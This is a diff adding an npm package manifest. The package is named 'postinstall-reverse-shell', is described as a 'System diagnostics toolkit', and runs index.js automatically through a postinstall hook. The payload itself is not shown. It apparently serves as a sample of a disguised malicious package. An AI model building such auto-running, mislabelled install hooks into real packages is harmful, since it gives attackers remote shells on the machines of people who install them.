@@ -1,0 +1,9 @@
+{
+  "name": "postinstall-reverse-shell",
+  "version": "1.0.0",
+  "description": "System diagnostics toolkit",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
